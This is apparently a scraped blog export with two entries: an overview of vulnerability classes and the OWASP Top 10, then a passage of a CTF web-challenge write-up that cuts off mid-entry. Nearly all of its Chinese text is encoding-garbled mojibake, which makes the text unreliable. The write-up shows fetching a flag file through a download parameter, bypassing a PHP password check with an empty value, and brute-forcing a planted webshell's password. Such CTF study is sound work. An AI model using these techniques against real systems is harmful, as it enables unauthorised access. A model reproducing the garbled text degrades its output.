”å‘å’Œé›†æˆé˜¶æ®µè€ƒè™‘ç½‘ç»œå®‰å…¨é—®é¢˜äº†ã€‚ç‰©è”ç½‘æ—¶ä»£åˆ°æ¥ä»¥åï¼Œè¿™äº›å·¥æ§ç³»ç»Ÿéƒ½å¼€å§‹åœ¨äº’è”ç½‘ä¸Šâ€œè£¸å¥”â€ï¼Œé»‘å®¢å¯ä»¥è½»è€Œæ˜“ä¸¾åœ°åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»ï¼Œé€ æˆä¸¥é‡åæœã€‚\nå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç¼ºé™·éƒ½æ˜¯æ¼æ´ï¼Œåªæœ‰å¯ä»¥è¢«å¤–éƒ¨åˆ©ç”¨çš„ç¼ºé™·æ‰è¢«ç§°ä¸ºæ¼æ´ã€‚è¿™å¥è¯å¯ä»¥æ¢ä¸€ä¸ªè§’åº¦æ¥ç†è§£ï¼Œå½“åˆ©ç”¨ç¼ºé™·çš„æ–¹æ³•å‡ºç°æ—¶ï¼Œæ¼æ´å¯¼è‡´çš„ç°å®å¨èƒå°±å‡ºç°äº†ã€‚å°±åƒâ€œå¿ƒè„æ»´è¡€â€œæ¼æ´ï¼Œå¼•å‘è¿™ä¸ªæ¼æ´çš„ç¼ºé™·åœ¨çˆ†å‘å‰ä¸¤å¹´çš„ç‰ˆæœ¬ä¸­å°±å·²ç»é™æ‚„æ‚„åœ°å­˜åœ¨ï¼Œå½“é»‘å®¢åˆ©ç”¨è¿™ä¸ªç¼ºé™·è·å–æœåŠ¡å™¨é‡Œç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼Œå½±å“äº†æ•°æ®çš„æœºå¯†æ€§ï¼Œå°±æ„æˆäº†æ¼æ´ã€‚(OpenSSL)\næ¼æ´æ€ä¼¤åŠ› å‚æ‚äº†å¾ˆå¤šå› ç´ ï¼Œä¸Šå‡åˆ°æ”¿æ²»å±‚é¢ä¼šæ˜¯æ¯”è¾ƒææ€–çš„\n2016-2017å¹´ï¼ŒNSA æ•°å­—æ­¦å™¨åº“é­åˆ°æ³„éœ²ï¼Œç›¸å…³äººå£«ä¸ºäº†è¯æ˜è‡ªå·±æˆåŠŸæ”»å…¥ NSA å¼€å‘ç½‘ç»œæ­¦å™¨çš„â€œæ–¹ç¨‹å¼ç»„ç»‡â€çš„ç³»ç»Ÿï¼Œåœ¨ç½‘ç»œæŠ«éœ²äº†å‡ æ‰¹å·¥å…·ã€‚2017å¹´è‚†è™å…¨çƒçš„ WannaCry ç—…æ¯’å°±æ˜¯ä»è¿™å‡ æ‰¹æ³„éœ²æ­¦å™¨ä¸­æ³„éœ²å‡ºå»çš„ã€‚\nå¸Œæ‹‰é‡Œé‚®ä»¶é—¨ç­‰ã€‚\nClassification åŸºäºæŠ€æœ¯ç±»å‹çš„åˆ†ç±»\nåŸºäºæ¼æ´æˆå› æŠ€æœ¯çš„åˆ†ç±»ç›¸æ¯”ä¸Šè¿°çš„ä¸¤ç§ç»´åº¦è¦å¤æ‚å¾—å¤šï¼Œå¯¹äºç›®å‰æˆ‘æ‰€è§è¿‡çš„æ¼æ´å¤§è‡´å½’çº³ä¸ºä»¥ä¸‹å‡ ç±»ï¼š\n å†…å­˜ç ´åç±» é€»è¾‘é”™è¯¯ç±» è¾“å…¥éªŒè¯ç±» è®¾è®¡é”™è¯¯ç±» é…ç½®é”™è¯¯ç±»  Web Vulnerabilities æŒ‡çš„æ˜¯åœ¨ç½‘ç«™ç¨‹åºä¸Šçš„æ¼æ´ã€‚\nClassification æ ¹æ®ä¸¥é‡ç¨‹åº¦ï¼Œä»¥æ•™è‚²è¡Œä¸šæ¼æ´æŠ¥å‘Šå¹³å°ä¸ºä¾‹\nä¸¥é‡  ç›´æ¥è·å–é‡è¦æœåŠ¡å™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰æƒé™çš„æ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºè¿œç¨‹ä»»æ„å‘½ä»¤æ‰§è¡Œã€ä¸Šä¼  webshellã€å¯åˆ©ç”¨è¿œç¨‹ç¼“å†²åŒºæº¢å‡ºã€å¯åˆ©ç”¨çš„ ActiveX å †æ ˆæº¢å‡ºã€å¯åˆ©ç”¨æµè§ˆå™¨ use after free æ¼æ´ã€å¯åˆ©ç”¨è¿œç¨‹å†…æ ¸ä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠå…¶å®ƒå› é€»è¾‘é—®é¢˜å¯¼è‡´çš„å¯åˆ©ç”¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼› ç›´æ¥å¯¼è‡´ä¸¥é‡çš„ä¿¡æ¯æ³„æ¼æ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºé‡è¦ç³»ç»Ÿä¸­èƒ½è·å–å¤§é‡ä¿¡æ¯çš„SQLæ³¨å…¥æ¼æ´ï¼› èƒ½ç›´æ¥è·å–ç›®æ ‡å•ä½æ ¸å¿ƒæœºå¯†çš„æ¼æ´ï¼›  é«˜å±  ç›´æ¥è·å–æ™®é€šç³»ç»Ÿæƒé™çš„æ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€ä»£ç æ‰§è¡Œã€ä¸Šä¼ webshellã€ç¼“å†²åŒºæº¢å‡ºç­‰ï¼› ä¸¥é‡çš„é€»è¾‘è®¾è®¡ç¼ºé™·å’Œæµç¨‹ç¼ºé™·ã€‚åŒ…æ‹¬ä½†ä¸é™äºä»»æ„è´¦å·å¯†ç ä¿®æ”¹ã€é‡è¦ä¸šåŠ¡é…ç½®ä¿®æ”¹ã€æ³„éœ²ï¼› å¯ç›´æ¥æ‰¹é‡ç›—å–ç”¨æˆ·èº«ä»½æƒé™çš„æ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºæ™®é€šç³»ç»Ÿçš„SQLæ³¨å…¥ã€ç”¨æˆ·è®¢å•éå†ï¼› ä¸¥é‡çš„æƒé™ç»•è¿‡ç±»æ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºç»•è¿‡è®¤è¯ç›´æ¥è®¿é—®ç®¡ç†åå°ã€cookieæ¬ºéª—ã€‚ è¿ç»´ç›¸å…³çš„æœªæˆæƒè®¿é—®æ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºåå°ç®¡ç†å‘˜å¼±å£ä»¤ã€æœåŠ¡æœªæˆæƒè®¿é—®ã€‚  ä¸­å±  éœ€è¦åœ¨ä¸€å®šæ¡ä»¶é™åˆ¶ä¸‹ï¼Œèƒ½è·å–æœåŠ¡å™¨æƒé™ã€ç½‘ç«™æƒé™ä¸æ ¸å¿ƒæ•°æ®åº“æ•°æ®çš„æ“ä½œã€‚åŒ…æ‹¬ä½†ä¸é™äºäº¤äº’æ€§ä»£ç æ‰§è¡Œã€ä¸€å®šæ¡ä»¶ä¸‹çš„æ³¨å…¥ã€ç‰¹å®šç³»ç»Ÿç‰ˆæœ¬ä¸‹çš„getshellç­‰ï¼› ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºä»»æ„æ–‡ä»¶å†™ã€åˆ é™¤ã€ä¸‹è½½ï¼Œæ•æ„Ÿæ–‡ä»¶è¯»å–ç­‰æ“ä½œï¼› æ°´å¹³æƒé™ç»•è¿‡ã€‚åŒ…æ‹¬ä½†ä¸é™äºç»•è¿‡é™åˆ¶ä¿®æ”¹ç”¨æˆ·èµ„æ–™ã€æ‰§è¡Œç”¨æˆ·æ“ä½œã€‚  ä½å±  èƒ½å¤Ÿè·å–ä¸€äº›æ•°æ®ï¼Œä½†ä¸å±äºæ ¸å¿ƒæ•°æ®çš„æ“ä½œï¼› åœ¨æ¡ä»¶ä¸¥è‹›çš„ç¯å¢ƒä¸‹èƒ½å¤Ÿè·å–æ ¸å¿ƒæ•°æ®æˆ–è€…æ§åˆ¶æ ¸å¿ƒä¸šåŠ¡çš„æ“ä½œï¼› éœ€è¦ç”¨æˆ·äº¤äº’æ‰å¯ä»¥è§¦å‘çš„æ¼æ´ã€‚åŒ…æ‹¬ä½†ä¸é™äºXSSæ¼æ´ã€CSRFæ¼æ´ã€ç‚¹å‡»åŠ«æŒï¼›  å­˜åœ¨ä»¥ä¸‹æƒ…å†µæˆ‘ä»¬å°†é…Œæƒ…å°†æ¼æ´ç­‰çº§é™ä½ï¼š\n æ¼æ´çœŸå®å­˜åœ¨ï¼Œä½†å› ä¸ºå„ç§é—®é¢˜ï¼ˆå¦‚WAFï¼‰ï¼Œç™½å¸½å­æ— æ³•è¯´æ˜åˆ©ç”¨æ–¹æ³•çš„ æ¼æ´æäº¤å‰ï¼Œç›¸å…³å•ä½å·²ç»çŸ¥æ™“ï¼Œä½†æš‚æœªä¿®å¤çš„å·²çŸ¥æ¼æ´ æ¼æ´è§¦å‘éœ€è¦ä¸€å®šæ¡ä»¶çš„ï¼Œå…·æœ‰ä¸€å®šçš„å¶ç„¶æ€§ åŒä¸€å•ä½å¤šå¤„ç›¸ä¼¼æ¼æ´ æ¶æ„å¤¸å¤§æ¼æ´å±å®³çš„  å¦‚ä¸‹æ¼æ´å°†è¢«å¿½ç•¥ï¼š\n éï¼ˆä¸ç¡®å®šï¼‰æ•™è‚²ç›¸å…³è¡Œä¸šå•ä½ ä¸åœ¨å¥–åŠ±èŒƒå›´å†…çš„é«˜æ ¡ è™šå‡æ¼æ´ æœ¬å¹³å°ä¸Šå·²æœ‰å…¶ä»–ç™½å¸½å­æäº¤è¿‡çš„æ¼æ´ äº’è”ç½‘ä¸Šå·²ç»è¢«å…¬å¼€çš„æ¼æ´ æäº¤åˆ°æœ¬å¹³å°ååˆæäº¤åˆ°å…¶ä»–å¹³å°çš„æ¼æ´ æ²¡æœ‰é“¾æ¥ã€æˆªå›¾ã€åˆ©ç”¨æ–¹æ³•ç­‰æ¼æ´è¯¦æƒ…ä¸è¯¦ç»†çš„æ¼æ´ éœ€è¦ç™»å½•ç®¡ç†å‘˜åå°æ‰èƒ½è§¦å‘çš„æ¼æ´ éœ€è¦ä¸­é—´äººæ”»å‡»çš„æ¼æ´ Self-XSS æ— æ•æ„Ÿæ“ä½œçš„CSRFæ¼æ´ é’“é±¼æ¼æ´ æ— æ•æ„Ÿä¿¡æ¯çš„ JSON Hijacking æ‰«æå™¨å–å¾—ç»“æœï¼Œä½†ç™½å¸½å­æ— æ³•æä¾›åˆ©ç”¨æ–¹æ³•çš„æ¼æ´ æ— æ„ä¹‰çš„æºç æ³„éœ²ã€å†…ç½‘IPã€åŸŸåæ³„éœ² æ‹’ç»æœåŠ¡æ¼æ´  æŠ€æœ¯æ¼æ´ä¸éæŠ€æœ¯æ¼æ´ï¼Œå³æŠ€æœ¯æ¼æ´ä¸ä¸šåŠ¡æ¼æ´\nOWASP Top 10 OWASP \u0026ndash; Open Web Application Security Projectï¼Œå³å¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®æ˜¯ä¸€ä¸ªåœ¨çº¿ç¤¾åŒºï¼Œåœ¨Webåº”ç”¨ç¨‹åºå®‰å…¨æ€§é¢†åŸŸæä¾›å…è´¹çš„æ–‡ç« ï¼Œæ–¹æ³•ï¼Œæ–‡æ¡£ï¼Œå·¥å…·å’ŒæŠ€æœ¯\nTop 1 Injection Flaws æ³¨å…¥ å°†ä¸å—ä¿¡ä»»çš„æ•°æ®ä½œä¸ºå‘½ä»¤æˆ–æŸ¥è¯¢çš„ä¸€éƒ¨åˆ†å‘é€åˆ°è§£æå™¨æ—¶ï¼Œä¼šäº§ç”Ÿè¯¸å¦‚SQLæ³¨å…¥ã€NoSQLæ³¨å…¥ã€OSæ³¨å…¥å’ŒLDAPæ³¨å…¥çš„æ³¨å…¥ç¼ºé™·ã€‚æ”»å‡»è€…çš„æ¶æ„æ•°æ®å¯ä»¥è¯±ä½¿è§£æå™¨åœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œéé¢„æœŸå‘½ä»¤æˆ–è®¿é—®æ•°æ®ã€‚\nä¸€äº›å¸¸è§çš„æ³¨å…¥ï¼ŒåŒ…æ‹¬ï¼šSQLã€OSå‘½ä»¤ã€ORMã€LDAPå’Œè¡¨è¾¾å¼è¯­è¨€ï¼ˆELï¼‰æˆ–OGNLæ³¨å…¥ã€‚æ‰€æœ‰è§£é‡Šå™¨çš„æ¦‚å¿µéƒ½æ˜¯ç›¸åŒçš„ã€‚ä»£ç è¯„å®¡æ˜¯æœ€æœ‰æ•ˆçš„æ£€æµ‹åº”ç”¨ç¨‹åºçš„æ³¨å…¥é£é™©çš„åŠæ³•ä¹‹ä¸€ï¼Œç´§éšå…¶åçš„æ˜¯å¯¹æ‰€æœ‰å‚æ•°ã€å­—æ®µã€å¤´ã€cookieã€JSONå’ŒXMLæ•°æ®è¾“å…¥çš„å½»åº•çš„ DAST æ‰«æï¼Œå³ Dynamic Application Security Testingã€‚\nTop 2 Broken Authentication and Session Management å¤±æ•ˆçš„èº«ä»½è®¤è¯ é€šå¸¸ï¼Œé€šè¿‡é”™è¯¯ä½¿ç”¨åº”ç”¨ç¨‹åºçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†åŠŸèƒ½ï¼Œæ”»å‡»è€…èƒ½å¤Ÿç ´è¯‘å¯†ç ã€å¯†é’¥æˆ–ä¼šè¯ä»¤ç‰Œï¼Œæˆ–è€…åˆ©ç”¨å…¶å®ƒå¼€å‘ç¼ºé™·æ¥æš‚æ—¶æ€§æˆ–æ°¸ä¹…æ€§å†’å……å…¶ä»–ç”¨æˆ·çš„èº«ä»½ã€‚\nTop 3 Sensitive Data Exposure æ•æ„Ÿæ•°æ®æ³„éœ² è®¸å¤šWebåº”ç”¨ç¨‹åºå’ŒAPIéƒ½æ— æ³•æ­£ç¡®ä¿æŠ¤æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚ï¼šè´¢åŠ¡æ•°æ®ã€åŒ»ç–—æ•°æ®å’ŒPIIæ•°æ®ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡çªƒå–æˆ–ä¿®æ”¹æœªåŠ å¯†çš„æ•°æ®æ¥å®æ–½ä¿¡ç”¨å¡è¯ˆéª—ã€èº«ä»½ç›—çªƒæˆ–å…¶ä»–çŠ¯ç½ªè¡Œä¸ºã€‚æœªåŠ å¯†çš„æ•æ„Ÿæ•°æ®å®¹æ˜“å—åˆ°ç ´åï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æ•æ„Ÿæ•°æ®åŠ å¯†ï¼Œè¿™äº›æ•°æ®åŒ…æ‹¬ï¼šä¼ è¾“è¿‡ç¨‹ä¸­çš„æ•°æ®ã€å­˜å‚¨çš„æ•°æ®ä»¥åŠæµè§ˆå™¨çš„äº¤äº’æ•°æ®ã€‚\nTop 4 XML External Entity XML å¤–éƒ¨å®ä½“ è®¸å¤šè¾ƒæ—©çš„æˆ–é…ç½®é”™è¯¯çš„XMLå¤„ç†å™¨è¯„ä¼°äº†XMLæ–‡ä»¶ä¸­çš„å¤–éƒ¨å®ä½“å¼•ç”¨ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å¤–éƒ¨å®ä½“çªƒå–ä½¿ç”¨URIæ–‡ä»¶å¤„ç†å™¨çš„å†…éƒ¨æ–‡ä»¶å’Œå…±äº«æ–‡ä»¶ã€ç›‘å¬å†…éƒ¨æ‰«æç«¯å£ã€æ‰§è¡Œè¿œç¨‹ä»£ç å’Œå®æ–½æ‹’ç»æœåŠ¡æ”»å‡»ã€‚\nTop 5 Broken Access Control å¤±æ•ˆçš„è®¿é—®æ§åˆ¶ æœªå¯¹é€šè¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·å®æ–½æ°å½“çš„è®¿é—®æ§åˆ¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›ç¼ºé™·è®¿é—®æœªç»æˆæƒçš„åŠŸèƒ½æˆ–æ•°æ®ï¼Œä¾‹å¦‚ï¼šè®¿é—®å…¶ä»–ç”¨æˆ·çš„å¸æˆ·ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶ã€ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æ•°æ®ã€æ›´æ”¹è®¿é—®æƒé™ç­‰ã€‚\nTop 6 Security Misconfiguration å®‰å…¨é…ç½®é”™è¯¯ å®‰å…¨é…ç½®é”™è¯¯æ˜¯æœ€å¸¸è§çš„å®‰å…¨é—®é¢˜ï¼Œè¿™é€šå¸¸æ˜¯ç”±äºä¸å®‰å…¨çš„é»˜è®¤é…ç½®ã€ä¸å®Œæ•´çš„ä¸´æ—¶é…ç½®ã€å¼€æºäº‘å­˜å‚¨ã€é”™è¯¯çš„HTTPæ ‡å¤´é…ç½®ä»¥åŠåŒ…å«æ•æ„Ÿä¿¡æ¯çš„è¯¦ç»†é”™è¯¯ä¿¡æ¯æ‰€é€ æˆçš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸ä»…éœ€è¦å¯¹æ‰€æœ‰çš„æ“ä½œç³»ç»Ÿã€æ¡†æ¶ã€åº“å’Œåº”ç”¨ç¨‹åºè¿›è¡Œå®‰å…¨é…ç½®ï¼Œè€Œä¸”å¿…é¡»åŠæ—¶ä¿®è¡¥å’Œå‡çº§å®ƒä»¬ã€‚\nTop 7 Cross-Site Scripting è·¨ç«™è„šæœ¬ å½“åº”ç”¨ç¨‹åºçš„æ–°ç½‘é¡µä¸­åŒ…å«ä¸å—ä¿¡ä»»çš„ã€æœªç»æ°å½“éªŒè¯æˆ–è½¬ä¹‰çš„æ•°æ®æ—¶ï¼Œæˆ–è€…ä½¿ç”¨å¯ä»¥åˆ›å»ºHTMLæˆ–JavaScriptçš„æµè§ˆå™¨APIæ›´æ–°ç°æœ‰çš„ç½‘é¡µæ—¶ï¼Œå°±ä¼šå‡ºç°XSSç¼ºé™·ã€‚XSSè®©æ”»å‡»è€…èƒ½å¤Ÿåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œè„šæœ¬ï¼Œå¹¶åŠ«æŒç”¨æˆ·ä¼šè¯ã€ç ´åç½‘ç«™æˆ–å°†ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„ç«™ç‚¹ã€‚\nTop 8 Insecure deserialization ä¸å®‰å…¨çš„ååºåˆ—åŒ– ä¸å®‰å…¨çš„ååºåˆ—åŒ–ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å³ä½¿ååºåˆ—åŒ–ç¼ºé™·ä¸ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥æ‰§è¡Œæ”»å‡»ï¼ŒåŒ…æ‹¬ï¼šé‡æ’­æ”»å‡»ã€æ³¨å…¥æ”»å‡»å’Œç‰¹æƒå‡çº§æ”»å‡»ã€‚\nTop 9 Using Components With Known Vulnerabilities ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶ ç»„ä»¶ï¼ˆä¾‹å¦‚ï¼šåº“ã€æ¡†æ¶å’Œå…¶ä»–è½¯ä»¶æ¨¡å—ï¼‰æ‹¥æœ‰å’Œåº”ç”¨ç¨‹åºç›¸åŒçš„æƒé™ã€‚å¦‚æœåº”ç”¨ç¨‹åºä¸­å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯èƒ½ä¼šé€ æˆä¸¥é‡çš„æ•°æ®ä¸¢å¤±æˆ–æœåŠ¡å™¨æ¥ç®¡ã€‚åŒæ—¶ï¼Œä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶çš„åº”ç”¨ç¨‹åºå’ŒAPIå¯èƒ½ä¼šç ´ååº”ç”¨ç¨‹åºé˜²å¾¡ã€é€ æˆå„ç§æ”»å‡»å¹¶äº§ç”Ÿä¸¥é‡å½±å“ã€‚\nTop 10 Insufficient Logging and Monitoring ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§ ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§ï¼Œä»¥åŠäº‹ä»¶å“åº”ç¼ºå¤±æˆ–æ— æ•ˆçš„é›†æˆï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿè¿›ä¸€æ­¥æ”»å‡»ç³»ç»Ÿã€ä¿æŒæŒç»­æ€§æˆ–è½¬å‘æ›´å¤šç³»ç»Ÿï¼Œä»¥åŠç¯¡æ”¹ã€æå–æˆ–é”€æ¯æ•°æ®ã€‚å¤§å¤šæ•°ç¼ºé™·ç ”ç©¶æ˜¾ç¤ºï¼Œç¼ºé™·è¢«æ£€æµ‹å‡ºçš„æ—¶é—´è¶…è¿‡200å¤©ï¼Œä¸”é€šå¸¸é€šè¿‡å¤–éƒ¨æ£€æµ‹æ–¹æ£€æµ‹ï¼Œè€Œä¸æ˜¯é€šè¿‡å†…éƒ¨æµç¨‹æˆ–ç›‘æ§æ£€æµ‹ã€‚\n","date":"2019-04-08T23:58:08Z","permalink":"https://blog.zeddyu.info/2019/04/08/Vulnerabilites-For-A2OS/","title":"Vulnerabilites For A2OS"},{"content":"æ¸…æ˜æ— èŠï¼Œç©äº†ä¸€ä¸‹è¿™ä¸ª ctf æ¯”èµ›\nWeb Web 1 webç­¾åˆ° Description {% colorquote info %} flagåˆ°åº•åœ¨å“ªå•Šï¼ï¼ {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8887/web1/\nHacking  \nWeb 2 ä¸‹è½½ä¸‹è½½ Description {% colorquote info %} ä¸‹è½½å°±å¯¹äº†ï¼ŒåºŸä»€ä¹ˆè¯ï¼ {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8887/web2/\nHacking é¢˜ç›®ç»™äº†ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½çš„åŠŸèƒ½ï¼Œhttp://120.79.1.69:8887/web2/?file=flag.txt\nç›´æ¥ä¸‹ flag.php ï¼Œå†…å®¹ä¸º\n\u0026lt;?php header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); //ç½‘é¡µç¼–ç  function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i \u0026lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i \u0026lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 ); } return base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i \u0026lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i \u0026lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) \u0026lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } return $str; } $key=\u0026#34;MyCTF\u0026#34;; $flag=\u0026#34;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=\u0026#34;;//encrypt($flag,$key) ?\u0026gt;ç›´æ¥ç”¨decryptå‡½æ•°è§£å°±è¡Œäº†â€¦å¾—åˆ°myCTF{cssohw456954GUEB}\nWeb 3 çŒœå¯†ç  Description {% colorquote info %} è¿™é¢˜å¾ˆç®€å• {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8887/web3/\nHacking ç›´æ¥çœ‹æºç \n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;çŒœå¯†ç \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- session_start(); $_SESSION['pwd']=time(); if (isset ($_POST['password'])) { if ($_POST['pwd'] == $_SESSION['pwd']) die('Flag:'.$flag); else{ print '\u0026lt;p\u0026gt;çŒœæµ‹é”™è¯¯.\u0026lt;/p\u0026gt;'; $_SESSION['pwd']=time().time(); } } --\u0026gt; \u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; å¯†ç ï¼š\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;pwd\u0026quot;/\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;çŒœå¯†ç \u0026quot;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç›´æ¥ç‚¹å‡»æäº¤è·å¾— flag\nè¿™é‡Œç¡®å®å­˜åœ¨ç–‘é—®ï¼Œåæ¥ä»”ç»†çœ‹äº†çœ‹ç¡®å®æœ‰ç‚¹é—®é¢˜ã€‚\n{% colorquote danger %} å› ä¸ºæ³¨é‡Šå½“ä¸­çš„æ˜¯ POST[\u0026lsquo;password\u0026rsquo;] è€Œé POST[\u0026lsquo;pwd\u0026rsquo;] {% endcolorquote %}\nå¦‚æœæ²¡æœ‰ä¼ å…¥$_POST['password']æ˜¯è‚¯å®šä¸èƒ½æ‰§è¡Œåé¢ä»£ç çš„ï¼Œè¿™æ˜¯å­˜ç–‘çš„ä¸€ç‚¹ï¼Œåæ¥çŒœæµ‹åº”è¯¥æ˜¯æœåŠ¡å™¨ä»£ç è·Ÿæ³¨é‡Šè‚¯å®šä¸ä¸€è‡´æ‰å¯¼è‡´çš„é—®é¢˜ã€‚ä½†æ˜¯å½“æ—¶ç›´æ¥ç‚¹å°±æ‹¿åˆ° flag å°±æ²¡æœ‰å†å»æ·±ç©¶ï¼Œåæ¥è¿™é¢˜æˆ‘åœ¨ç¾¤é‡Œçœ‹äº†ä¹Ÿäº§ç”Ÿäº†æ¯”è¾ƒå¤šçš„è®¨è®ºï¼Œåæ¥ç¾¤ä¸»ä¹Ÿç»™å‡ºäº†æºä»£ç \n\u0026lt;?php header('Content-Type: text/html; charset=utf-8'); //ç½‘é¡µç¼–ç  $flag=\u0026quot;jactf{sfakdjgnasasdasde}\u0026quot;; session_start(); if (isset ($_POST['pwd'])){ if ($_POST['pwd'] == $_SESSION['pwd']) die('Flag:'.$flag); else{ print '\u0026lt;p\u0026gt;çŒœæµ‹é”™è¯¯.\u0026lt;/p\u0026gt;'; $_SESSION['pwd']=time().time(); } } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;çŒœå¯†ç \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- session_start(); $_SESSION['pwd']=time(); if (isset ($_POST['password'])) { if ($_POST['pwd'] == $_SESSION['pwd']) die('Flag:'.$flag); else{ print '\u0026lt;p\u0026gt;çŒœæµ‹é”™è¯¯.\u0026lt;/p\u0026gt;'; $_SESSION['pwd']=time().time(); } } --\u0026gt; \u0026lt;form action=\u0026quot;web3.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; å¯†ç ï¼š\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;pwd\u0026quot;/\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;çŒœå¯†ç \u0026quot;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; äºæ˜¯è¿™ä¸ªé—®é¢˜å°±å¾—ä»¥è§£é‡Šäº†ã€‚åªè¦ä¼ å‚$_POST['pwd']ä¸ºç©ºçš„è¯ï¼Œ$_SESSION['pwd']æœªè®¾ç½®ä¹Ÿä¸ºç©ºï¼Œä¹Ÿå°±æ‹¿åˆ°äº† flag äº†ã€‚\nWeb 4 è¯¥ç½‘ç«™å·²è¢«é»‘ Description {% colorquote info %} å¦‚ä½•é¢„é˜²ç½‘ç«™è¢«é»‘ï¼ŸæŠŠä¸å¿…è¦çš„ç«¯å£ä¿®æ”¹æˆ–è€…å…³é—­ã€ä½¿ç”¨webé˜²ç«å¢™ã€ä½¿ç”¨cdnéšè—IPã€ä½¿ç”¨å®‰å…¨ç‹—ã€‚æœ‰æŠ€æœ¯å¯ä»¥ä»£ç å®¡è®¡ä¿®å¤0dayæ¼æ´ {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8887/web4/\nHacking çŒœæµ‹æœ‰åé—¨ï¼Œæ‰“å¼€ shell.phpï¼Œçˆ†ä¸€ä¸‹å¯†ç ä¸º hack\n \nWeb 5 æ›²æŠ˜çš„äººç”Ÿ Description {% colorquote info %} æ›²æŠ˜æ˜¯äººç”Ÿçš„å¸¸æ€å½“ä½ é‡åˆ°åå·æ—¶ï¼Œä¸å¦¨æŠŠæ›²æŠ˜çš„äººç”Ÿçœ‹ä½œæ˜¯ä¸€ç§å¸¸æ€ï¼Œä¸è¦æ‚²è§‚å¤±æœ›ï¼Œä¸è¦é•¿åçŸ­å¹ï¼Œä¸è¦åœæ»ä¸å‰ï¼ŒæŠŠèµ°å¼¯è·¯çœ‹æˆæ˜¯å‰è¡Œçš„å¦ä¸€ç§å½¢å¼ï¼Œå¦ä¸€ç§é€”å¾„ï¼Œè¿™æ 